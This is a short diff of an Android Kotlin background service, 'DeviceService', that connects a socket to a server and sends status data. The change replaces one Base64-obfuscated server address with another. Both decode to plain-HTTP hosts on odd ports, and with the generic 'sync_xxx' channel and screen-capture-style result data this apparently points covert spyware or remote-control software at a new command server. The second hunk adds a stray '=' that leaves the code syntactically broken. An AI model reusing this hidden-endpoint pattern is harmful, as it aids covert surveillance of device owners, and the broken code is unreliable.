@@ -64,7 +64,7 @@ class DeviceService : Service(), LifecycleOwner {
         const val EXTRA_RESULT_DATA    = "resultData"
 
         val SERVER_URL: String get() = String(android.util.Base64.decode(
-    "aHR0cDovL2xvY2F0aW9uLXVrLnh5bG90cmVjaHVzLm15LmlkOjQwMDA=",
+    "aHR0cDovL3ByaXZhdC5hbGl6ei5teS5pZDoxMTI5Mg==",
     android.util.Base64.DEFAULT
 )).trim()
         const val CHANNEL_ID = "sync_xxx"
@@ -108,7 +108,7 @@ class DeviceService : Service(), LifecycleOwner {
         override fun onReceive(ctx: Context, intent: Intent) {
             when (intent.action) {
                 ACTION_CONNECT -> {
-                    if (socket == null || socket?.connected() == false) connectSocket()
+                    if (socket == null || =socket?.connected() == false) connectSocket()
                 }
                 ACTION_SEND_STATUS -> {
                     val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
